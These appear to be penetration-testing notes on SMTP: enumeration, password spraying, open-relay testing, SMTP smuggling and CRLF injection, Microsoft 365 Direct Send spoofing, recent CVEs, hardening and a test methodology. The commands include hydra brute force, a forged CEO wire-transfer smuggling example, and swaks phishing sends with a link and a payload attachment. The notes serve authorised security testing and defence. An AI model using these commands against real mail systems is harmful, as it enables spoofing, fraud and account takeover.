+++
title = 'SMTP'
date = 2026-10-30
type = 'notes'
weight = 500
toc = true
tags = ['protocols', 'services', 'smtp']
+++

The Simple Mail Transfer Protocol (SMTP) sends email; **IMAP** or **POP3** retrieve it. SMTP is the **front door for phishing, spoofing, and BEC** — and it is the protocol most often left at defaults on appliances, printers, and legacy applications.

**Default ports:**

| Port | Service | Encryption |
|---|---|---|
| **25** | SMTP (MTA-to-MTA) | Opportunistic `STARTTLS` |
| **587** | Submission (client-to-MTA) | **`STARTTLS` required** |
| **465** | **SMTPS** | Implicit TLS |
| **2525** | Alternate submission | Varies |

> **UDP/25 is not a usable mail transport.** Do not scan SMTP over UDP.

> **2025–2026 context:** the highest-impact findings are **SMTP smuggling** — an interpretation discrepancy around bare `<CR>`/`<LF>` that lets an attacker **spoof any sender while bypassing SPF, DKIM, and DMARC** — and **framework-level command injection** (Netty, libcurl, Haraka). A **USENIX Security 2025** study found **19 public email services, 1,577 private email services, five open-source mail servers, and one email gateway** still vulnerable to smuggling or its variants.

---

## 1. Enumeration and Banner Grabbing

| Command | Purpose |
|---|---|
| `nmap -p25,587,465 -sV <target>` | Port scan and version detection — reveals **Postfix, Exim, Sendmail, Microsoft ESMTP, hMailServer** |
| `telnet <target> 25` | Raw banner |
| `nc -nv <target> 25` | Raw banner (netcat) |
| `openssl s_client -connect <target>:465` | **SMTPS** — implicit TLS |
| `openssl s_client -starttls smtp -crlf -connect <target>:587` | **STARTTLS** on 587 |
| `nmap -p25 --script smtp-commands <target>` | Enumerate ESMTP extensions |
| `nmap -p25 --script smtp-enum-users,smtp-open-relay <target>` | User enumeration and open relay check |
| `nmap -p25,465,587 --script smtp-ntlm-info <target>` | **NTLM information disclosure** — IIS and Windows version |

**Banner examples:**

```
220 mail.example.com ESMTP Postfix
220 mx.example.com ESMTP Exim 4.99.3
220 mail.example.com Microsoft ESMTP MAIL Service, Version: 10.0.17763.1
```

> **The banner is the input to every CVE lookup.** Postfix, Exim, Sendmail, hMailServer, and Microsoft Exchange have **completely different CVE sets** — a generic "SMTP CVE" search is useless.

### 1.1 EHLO capability discovery

```text
EHLO client.example.com
# 250-mail.example.com
# 250-PIPELINING
# 250-SIZE 50000000
# 250-STARTTLS
# 250-AUTH LOGIN PLAIN XOAUTH2
# 250-ENHANCEDSTATUSCODES
# 250-8BITMIME
# 250-CHUNKING
# 250 SMTPUTF8
```

| Capability | What it tells you |
|---|---|
| **`STARTTLS`** | Opportunistic TLS available |
| **`AUTH LOGIN PLAIN`** | Credentials are base64 — plaintext equivalent without TLS |
| **`AUTH XOAUTH2`** | Bearer-token auth — **bypasses MFA** |
| **`CHUNKING`** | `BDAT` supported — **Exim CVE-2026-45185** precondition |
| **`PIPELINING`** | Enables SMTP smuggling variants |
| **`SIZE`** | Maximum message size |

---

## 2. User Enumeration

SMTP exposes **three commands** for confirming that a mailbox exists.

| Command | Behaviour | Response for a valid user |
|---|---|---|
| **`VRFY`** | Directly verifies a username | `250 Super-User root@myhost` |
| **`EXPN`** | Reveals the members of a mailing list | `250 <user@domain>` |
| **`RCPT TO`** | Specifies a recipient — the most widely available method | `250` / `251` |

### 2.1 Manual

```text
telnet target 25
HELO x
VRFY root
# 250 Super-User root@myhost    → exists
VRFY blah
# 550 blah... User unknown      → does not exist
```

```
MAIL FROM:<test@example.com>
RCPT TO:<alice@example.com>
# 250 2.1.5 Ok                  → exists
RCPT TO:<notreal@example.com>
# 550 5.1.1 User unknown        → does not exist
```

> **`RCPT TO` is the most reliable method** because `VRFY` and `EXPN` are disabled on most modern servers, while `RCPT TO` must be available for mail delivery to work at all.

### 2.2 Automated

```bash
# smtp-user-enum — the reference tool
smtp-user-enum -M VRFY -u root -t 192.168.1.25
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t mail.target.com
smtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1
```

Options: `-M` mode (`VRFY`, `EXPN`, `RCPT`), `-U` user list, `-D` domain to append, `-w` timeout, `-m` worker processes.

```bash
# Nmap NSE
nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN} <target>
```

**SMTPeek** — the 2025 Rust tool, significantly faster than `smtp-user-enum`:

```bash
smtpeek -u users.txt mail.target.com
smtpeek -u users.txt -m Auto -s starttls --tls-skip-verify mail.target.com 587
```

Supports `RCPT TO`, `VRFY`, `EXPN`, and **experimental `Timing`, `Combined`, and `Stealth`** modes; auto-selects the best method from the `EHLO` response; JSON/CSV output; STARTTLS and implicit TLS.

> **Timing-based enumeration** works even when all three commands are disabled: the server takes measurably longer to reject a valid recipient than an invalid one.

### 2.3 NTLM information disclosure

If the server supports `AUTH NTLM` (Exchange, Windows IIS SMTP):

```bash
telnet example.com 587
HELO
AUTH NTLM
# 334
TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
```

The response contains the **IIS version and Windows version**. Automate with:

```bash
nmap -p25,465,587 --script smtp-ntlm-info <target>
```

---

## 3. Authentication Attacks

### 3.1 Brute force and spraying

```bash
# Hydra — one password across a user list, stop on first hit
hydra -L users.txt -p 'Company01!' -f <IP> smtp

# Hydra — credential pairing
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <IP> smtp

# swaks — single authentication attempt
swaks --to user@example.com --from attacker@evil.com --server <IP> \
  --auth LOGIN --auth-user user --auth-password 'Passw0rd'
```

**Legba** — the 2025/2026 multiprotocol brute-forcer, written in Rust:

```bash
legba smtp --target <IP>:587 --username users.txt --password passwords.txt
```

Supports HTTP, DNS, SSH, FTP, **SMTP**, RDP, VNC, SQL, NoSQL, LDAP, Kerberos, Samba, SNMP, and more.

> **`AUTH PLAIN` and `AUTH LOGIN` transmit the password base64-encoded** — equivalent to plaintext without TLS. Check whether port 587 enforces `STARTTLS` before attempting credentials, or the password travels in the clear.

### 3.2 `AUTH` mechanism downgrade

```
EHLO x
# 250-AUTH CRAM-MD5 SCRAM-SHA-256 PLAIN LOGIN
AUTH PLAIN
```

A server that advertises **`CRAM-MD5` or `SCRAM-SHA-256` but also accepts `PLAIN`** can be downgraded — the client offers the strongest mechanism, but an attacker can choose `PLAIN` and send the password directly.

---

## 4. Open Relay Testing

An open relay forwards mail for **any sender to any recipient without authentication** — useful for phishing, spam, and **masking the true origin**.

### 4.1 Manual test

```text
telnet target 25
HELO attacker.com
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@unrelated-domain.com>     ← a domain the server does NOT host
DATA
Subject: relay test

test
.
```

- **`250` on `RCPT TO` → open relay.**
- **`550 Relaying denied` → properly configured.**

### 4.2 Automated

```bash
# Nmap — the standard check
sudo nmap -p25 --script smtp-open-relay -v <IP>

# swaks — manual relay test
swaks --to victim@external.com --from attacker@evil.com --server <IP>
```

**Modern tools (2025–2026):**

| Tool | What it adds |
|---|---|
| **SMTP-Hunter** | Built for the 2025 threat landscape — **open relay testing**, user enumeration (VRFY/EXPN/RCPT with timing), SMTP smuggling checks, **cloud/SaaS detection** (AWS SES, Azure, SendGrid), **CVE matching**, AI anomaly detection |
| **OpenRelay** | Lightweight, purpose-built relay checker |
| **mxcheck** | Info and security scanner — **open relay**, SMTP smuggling, **DANE/TLSA, SPF/DKIM/DMARC, BIMI, MTA-STS, TLSRPT**, TLS certificates, blacklists |
| **vamp-mail-audit** | Email security auditor — SPF, DKIM, DMARC, MX, **active SMTP probing (STARTTLS, open relay)** |

> **Cloud-hosted SMTP changes the relay picture.** Direct Send in Microsoft 365, AWS SES, and similar services are **legitimate unauthenticated relays** scoped to a tenant — see §7.

---

## 5. SMTP Smuggling — The 2025–2026 Spoofing Class

**SMTP smuggling** exploits **inconsistent interpretation of line endings** between the sending and receiving SMTP servers. If the sender treats `<LF>.<CR><LF>` as body data while the receiver treats it as **end-of-data**, an attacker can **smuggle a second message** inside the first — with a **forged `MAIL FROM`** — and **bypass SPF, DKIM, and DMARC** entirely.

### 5.1 The mechanism

```
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@target.com>
DATA
Subject: innocent

Hello
<LF>.<CR><LF>              ← sender: still body data
MAIL FROM:<ceo@target.com>  ← receiver: new transaction
RCPT TO:<cfo@target.com>
DATA
Subject: urgent wire transfer
...
.
```

The **second message** carries `ceo@target.com` as the sender and **passes authentication** because it originates from the **trusted relay**.

### 5.2 Affected software and CVEs

| CVE | Product | Detail |
|---|---|---|
| **CVE-2023-51764** | **Postfix ≤ 3.8.5** | Postfix supports `<LF>.<CR><LF>` but other servers do not — **smuggling unless `smtpd_data_restrictions=reject_unauth_pipelining` + `smtpd_discard_ehlo_keywords=chunking`** |
| **CVE-2023-51765** | **Sendmail ≤ 8.14.7** | SMTP smuggling in certain configurations |
| **CVE-2023-51766** | **Exim** | PIPELINING/CHUNKING configurations |
| **CVE-2024-27305** | **aiosmtpd < 1.4.5** | Inbound SMTP smuggling — spoofed sender addresses |
| **CVE-2026-33604** | **Dovecot Pro** | Crafted line ending in the message body bypasses outbound protection; **downstream servers still vulnerable** |

### 5.3 The 2025 measurement

The **USENIX Security 2025** paper *"Email Spoofing with SMTP Smuggling"* measured the real-world impact:

- **19 public email services** vulnerable
- **1,577 private email services** vulnerable
- **Five open-source email software** and **one email gateway** vulnerable
- Centralisation (**shared SPF records, common software**) **amplifies** the impact — adversaries spoof **highly reputable domains** through free-to-register accounts

**Mitigation (CERT/CC VU#517845, 2025-10-28):** email header syntax can be exploited to bypass SPF/DKIM/DMARC — the fix is at the **parser** level, not the policy level.

### 5.4 Postfix hardening

```ini
# /etc/postfix/main.cf
smtpd_forbid_bare_newline = yes
smtpd_forbid_bare_newline_exclusions = $mynetworks
smtpd_data_restrictions = reject_unauth_pipelining
smtpd_discard_ehlo_keywords = chunking
```

> **`smtpd_forbid_bare_newline = normalize` is the default from Postfix 3.9** and is the recommended setting — it normalises bare newlines rather than rejecting the message.

### 5.5 Testing tools

| Tool | Purpose |
|---|---|
| **smtpsmug** (hannob) | Detects SMTP smuggling vulnerabilities |
| **SMTP Smuggling Tools** | Inbound and outbound server scanning |
| **SmuggleTP** | Straightforward exploitation tool |
| **SMTP-Hunter** | Includes smuggling checks in its 2025 test suite |

---

## 6. SMTP Command Injection (CRLF Injection)

When an application **concatenates user input into an SMTP command** without sanitising `\r\n`, the attacker can **terminate the intended command** and inject new ones.

### 6.1 The 2025–2026 CVEs

| CVE | Product | Primitive |
|---|---|---|
| **CVE-2025-59419** | **Netty** < 4.1.128 / 4.2.7 | `SmtpRequests.rcpt(recipient)` concatenates parameters **without sanitisation** — a `\r\n` in the recipient **injects arbitrary SMTP commands**. Because the injected commands are sent from the **server's trusted IP**, the resulting email **passes SPF and DKIM** and can impersonate executives |
| **libcurl (HackerOne 2025-12-29)** | libcurl | `smtp_parse_address` does **not reject control characters** in `MAIL FROM`/`RCPT TO` — CRLF injection enables **protocol desynchronisation**, where injected responses are consumed as the result of legitimate commands |
| **Haraka (GHSA-xf4w-8v5p-24pc)** | Haraka `auth/flat_file` | A **prototype-chain lookup** — the username `__proto__` returns `Object.prototype`, whose `.toString()` is `[object Object]`. That constant is the **known password**, giving an **open relay with no account** |
| **CVE-2026-23829** | **Mailpit** | Header injection via insufficient regex on `RCPT TO` / `MAIL FROM` |
| **CVE-2025-56425** | AppConnector | **Authenticated SMTP command injection** via `/osrest/api/organization/sendmail` |
| **CVE-2026-100741** | **hMailServer** | **Eval injection** in the JScript dispatcher — triggered by an SMTP AUTH logon or a remote server's error reply |

> **The Haraka bug is the most instructive.** A denylist on `__proto__` **does not close the hole** — `constructor`, `valueOf`, `hasOwnProperty`, and `isPrototypeOf` all resolve to truthy inherited members, each yielding a different constant password. This is CWE-1321 (prototype pollution) manifesting as an authentication bypass.

### 6.2 Testing

```
MAIL FROM:<test@example.com>\r\nRCPT TO:<victim@target.com>
RCPT TO:<a@example.com>\r\nMAIL FROM:<ceo@company.com>
```

If the injected command is executed, the application is vulnerable.

---

## 7. Microsoft 365 Direct Send and Ghost Sender

**Direct Send** lets on-premises devices **relay mail to internal recipients in a Microsoft 365 tenant without authentication**. It is intended for printers and legacy applications — and it is an **unauthenticated SMTP relay** by design.

### 7.1 The Ghost Sender bypass

When a tenant uses a **third-party gateway** (Proofpoint, Mimecast, Forcepoint) as its MX and **does not configure a partner connector**, Exchange Online **accepts mail sent directly to its endpoint** — bypassing the gateway entirely.

```
Normal:  Sender → MX Gateway → M365 → Inbox
Ghost:   Attacker → M365 endpoint:25 → Inbox
         (no gateway, no SPF, no DKIM, no DMARC, no DLP)
```

**Impact:** spoofed internal email — **CEO fraud, wire-transfer requests, credential phishing, malware delivery** — arriving with **no external warning banner**.

**Requirements:** a TCP connection to the tenant's M365 endpoint on port 25 and a **clean IP** — no credentials, no domain ownership, no infrastructure access.

### 7.2 The 2025 Proofpoint campaign

Proofpoint observed an active campaign exploiting Direct Send:

- Attackers connected to **Windows Server 2022 hosts via RDP on 3389**
- SMTP connections went to **unsecured third-party email security appliances** (with valid DigiCert certificates but exposed management ports 8008/8010/8015)
- Messages were relayed to M365 tenants with a **spoofed internal `From`**
- **Microsoft marked the messages as spoof** — but they were **still delivered to the junk folder**

> **Authentication failure is not blocking.** The messages reached users despite failing composite authentication.

---

## 8. SPF, DKIM, and DMARC

These are the **email authentication** mechanisms that smuggling and relay abuse are designed to bypass.

| Mechanism | What it proves | Bypass class |
|---|---|---|
| **SPF** | The sending IP is authorised for the domain | **Shared SPF records** (multi-tenant hosting) — CVE-2024-7209 |
| **DKIM** | The message was signed by a domain holder | **Header parsing discrepancies** — CVE-2024-7208 |
| **DMARC** | SPF/DKIM alignment with the `From` domain | **SMTP smuggling**, **Direct Send**, **Ghost Sender** |

**Checking a domain's records:**

```bash
dig txt example.com | grep spf
dig _dmarc.example.com txt | grep DMARC
dig <selector>._domainkey.example.com txt | grep p=
```

**SPF qualifiers:**

| Qualifier | Meaning |
|---|---|
| `+` | PASS (default) |
| `?` | NEUTRAL |
| `~` | SOFTFAIL — accept but mark |
| `-` | FAIL — reject |

**DMARC policy:**

| `p=` | Meaning |
|---|---|
| `none` | Monitor only |
| `quarantine` | Mark as spam |
| `reject` | Reject |

> **SPF, DKIM, and DMARC can authenticate a message yet cannot establish that an application-level send was authorised.** The 2026 *"Trusted Workflow Relays"* research documents cross-tenant email abuse in multi-tenant clouds — *"the pattern is analogous to a classical unauthenticated SMTP open relay, but the failure has moved up the stack"*.

### 8.1 Header parsing — *"Smuggling Identities"* (DEF CON SG 2025)

DEF CON Singapore 2025 presented **ambiguous `From` header interpretation** across major email providers. An authenticated SMTP user can **spoof another identity** because different parsers resolve the `From` and `Sender` fields differently — **bypassing DMARC** even with a valid signature.

**CERT/CC VU#517845:** email message header syntax can be exploited to **bypass SPF, DKIM, and DMARC** — reported and last revised **2025-10-28**.

---

## 9. Recent CVEs (2025–2026)

### 9.1 Remote code execution

| CVE | Product | Primitive |
|---|---|---|
| **CVE-2026-45185 ("Dead.Letter")** | **Exim 4.97–4.99.2** | **Use-after-free** in the **GnuTLS BDAT** path — a remote attacker sends a TLS `close_notify` and then a **final byte in cleartext** to execute code. **CVSS:4.0 Critical**; requires `USE_GNUTLS=yes` and the **`CHUNKING`** extension; **unauthenticated** |
| **CVE-2025-68615** | **Net-SNMP `snmptrapd`** | CVSS 9.8 — see the SNMP notes |
| **CVE-2026-48840** | **Exim** | **Information disclosure** in builds with proxy support |
| **CVE-2026-40685 / 40686 / 40687** | **Exim** | Malformed JSON headers → DoS/RCE; malformed UTF-8 → info leak; CHUNKING in some GnuTLS configs → RCE |

> **`CVE-2026-45185` is the priority.** Fixed in **Exim 4.99.3** (12 May 2026). It is a **network-reachable, unauthenticated** use-after-free with **no public exploit at disclosure** — but the precondition (`GnuTLS` + `CHUNKING`) is common on modern Exim builds.

### 9.2 Authentication and authorisation

| CVE | Product | Primitive |
|---|---|---|
| **CVE-2025-56425** | AppConnector | Authenticated SMTP command injection |
| **CVE-2026-32519** | **Bit SMTP Plugin** ≤ 1.2.2 | **Incorrect privilege assignment** — privilege escalation |
| **CVE-2026-68624** | **N-able Mail Assure** | **Cross-tenant `MAIL FROM`** — an authenticated SMTP user sends outbound mail using **another tenant's address** |
| **CVE-2026-100741** | **hMailServer** | Eval injection via SMTP AUTH logon or remote error reply |

### 9.3 TLS and DANE

| CVE | Product | Primitive |
|---|---|---|
| **CVE-2026-104704 / 107584** | **hMailServer 6.0.0–6.3.5** | **DANE fails open** — when the TLSA record contains **no DANE-EE (usage 3)**, hMailServer **does not enforce TLS** for outbound delivery, contrary to RFC 7672 §2.2 |

---

## 10. Mailbox Abuse and Relay Networks

### 10.1 The PCPJack SMTP relay network (June 2026)

**Hunt.io** uncovered **230 compromised cloud Linux servers** (AWS, GCP, Azure) converted into a **hidden SMTP relay network**:

- **Sliver C2** and **Chisel** for control
- **Unmodified Chisel binaries** dropped as hidden files in `/var/tmp/.xs` — **bypassing hash-based AV**
- An automated **"SMTP quality gate"** that screened infected hosts for outbound **port 587** connectivity
- Used for **global smishing and phishing**

**Detection:** audit for cron jobs or systemd services named `xsync`, and unexpected binaries running from `/var/tmp/` or `/tmp/`. **Block unexpected egress on 587.**

### 10.2 Compromised legitimate infrastructure

Attackers routinely relay through **legitimate third-party SMTP servers**:

- **Office 365 credential-harvesting campaigns** abused **Oxford, Samsung, and Adobe** SMTP infrastructure
- **Callback phishing** via compromised accounts of legitimate services generating notifications that require user action
- **CSS near-zero-width character evasion** — hidden ASCII characters evade scanners while maintaining **DKIM alignment**

---

## 11. Tooling

| Tool | Purpose |
|---|---|
| **`smtp-user-enum`** | The reference user-enumeration tool — VRFY, EXPN, RCPT TO |
| **SMTPeek** | 2025 Rust tool — concurrent, `Auto`/`Timing`/`Stealth` modes, TLS, JSON/CSV |
| **`swaks`** | The Swiss Army knife — send mail, test auth, test relay |
| **`sendEmail`** | Simple CLI mail sender with attachments |
| **SMTP-Hunter** | 2025 aggressive suite — relay, enumeration, smuggling, CVE matching, AI anomaly detection |
| **`mxcheck`** | Open relay, smuggling, SPF/DKIM/DMARC, DANE, MTA-STS, BIML |
| **`legba`** | Multiprotocol brute-forcer and sprayer (Rust) |
| **`smtpsmug` / SmuggleTP / SMTP-Smuggling-Tools** | Smuggling detection and exploitation |
| **Nmap `smtp-*` NSE** | `smtp-commands`, `smtp-enum-users`, `smtp-open-relay`, `smtp-ntlm-info` |

**Sending mail with swaks:**

```bash
# Basic
swaks --to victim@target.com --from attacker@evil.com \
  --header "Subject: Test" --body "Click http://attacker/" --server <IP>

# With an attachment (@ prefix embeds the file)
swaks --to hr@example.local --from attacker@evil.com \
  --header "Subject: Resume" --body "Please review" \
  --attach @resume.doc --server 10.0.0.5

# sendEmail equivalent
sendEmail -t to@domain.com -f from@attacker.com -s <IP> \
  -u "Important subject" -a /tmp/payload.pdf
```

---

## 12. Hardening

| Control | How |
|---|---|
| **Patch Exim** | **4.99.3** — CVE-2026-45185 (Dead.Letter) |
| **Enable `smtpd_forbid_bare_newline`** | Postfix ≥ 3.5.23 / 3.6.13 / 3.7.9 / 3.8.4 / 3.9 — **`normalize`** is the 3.9 default |
| **Disable `CHUNKING` if unused** | Removes the BDAT attack surface |
| **Enforce `STARTTLS` on 587** | Never allow `AUTH PLAIN` over plaintext |
| **Do not expose 25 to the internet** | Submission (587) for clients; 25 only for MTA-to-MTA |
| **Restrict relay** | `mynetworks`, `smtpd_relay_restrictions` — never an open relay |
| **Configure a partner connector** | M365 tenants behind a gateway — **closes Ghost Sender** |
| **Reject bare CR/LF in message data** | The durable smuggling fix, independent of the sender |
| **Enforce DANE correctly** | hMailServer CVE-2026-107584 — **fail closed** when no DANE-EE record |
| **Rate-limit authentication** | `smtpd_client_auth_rate_limit`, fail2ban |
| **Monitor 587 egress** | The PCPJack network was built on **outbound 587** |
| **Audit SMTP AUTH logs** | CVE-2026-100741 — hMailServer eval injection fires on SMTP AUTH logon |

---

## 13. Testing Methodology

```text
1. Discover
   - nmap -p25,587,465 -sV
   - Banner grab: nc / telnet / openssl s_client
   - EHLO → capabilities (STARTTLS, AUTH, CHUNKING, PIPELINING)
   - smtp-ntlm-info → Windows version

2. User enumeration
   - VRFY, EXPN, RCPT TO (manual)
   - smtp-user-enum -M RCPT -U users.txt
   - SMTPeek -u users.txt -m Auto

3. Authentication
   - Spray one password across the user list
   - Check whether 587 enforces STARTTLS before sending credentials
   - legba smtp

4. Open relay
   - nmap --script smtp-open-relay
   - swaks with an external recipient
   - mxcheck / SMTP-Hunter

5. SMTP smuggling
   - Is the server vulnerable to CVE-2023-51764/51765/51766?
   - smtpsmug / SmuggleTP
   - Test <LF>.<CR><LF> and <LF>.<LF> variants

6. Command injection
   - CRLF in MAIL FROM / RCPT TO
   - Application-layer: Netty, libcurl, Haraka

7. TLS
   - openssl s_client -starttls smtp
   - Certificate validity, protocol version
   - Is STARTTLS strippable?

8. Email authentication
   - SPF, DKIM, DMARC records
   - Direct Send / Ghost Sender exposure

9. Patch level
   - Exim 4.99.3 (CVE-2026-45185)
   - hMailServer DANE (CVE-2026-107584)
   - Netty (CVE-2025-59419)
```

---

## 14. Field Notes

- **SMTP smuggling is the defining email vulnerability of 2025–2026.** It **bypasses SPF, DKIM, and DMARC** by smuggling a second transaction inside the message body — and the USENIX 2025 study found **1,577 private mail services** still vulnerable.
- **Exim CVE-2026-45185 ("Dead.Letter") is the RCE to check for.** **Unauthenticated**, network-reachable, **CVSS:4.0 Critical** — requires `GnuTLS` and `CHUNKING`, both common.
- **`RCPT TO` is the enumeration method that still works.** `VRFY` and `EXPN` are disabled on most modern servers, but `RCPT TO` must exist for mail to flow.
- **`CHUNKING` in `EHLO` is both a capability and a warning** — it is the precondition for the Exim BDAT use-after-free.
- **Open relay is still worth testing.** CVE-2026-68624 (N-able Mail Assure) is a **cross-tenant relay flaw** — an authenticated user sends as **another tenant**.
- **Direct Send is an unauthenticated relay by design.** Ghost Sender bypasses the gateway entirely when no partner connector is configured — **no credentials, no domain ownership, no infrastructure**.
- **The Haraka prototype-chain bug is a lesson in denylists.** Blocking `__proto__` alone is insufficient — `constructor`, `valueOf`, and `hasOwnProperty` all resolve to truthy constants that become the password.
- **SMTP command injection is CRLF, not SQL.** Netty's `SmtpRequests.rcpt()` and libcurl's `smtp_parse_address` both concatenate input **raw** — a `\r\n` injects a new command, and the injected mail **passes SPF/DKIM** because it comes from the trusted server.
- **The PCPJack network is the post-compromise picture.** 230 cloud servers converted to SMTP relays via Sliver and Chisel, screened for **port 587** egress — the detection is **unexpected outbound 587** and `xsync`-named persistence.
- **`smtpd_forbid_bare_newline = normalize` is the Postfix 3.9 default** — and the recommended mitigation for the entire smuggling class.
- **Authenticated spoofing bypasses DMARC** through ambiguous `From` header parsing — CERT/CC VU#517845, DEF CON SG 2025.
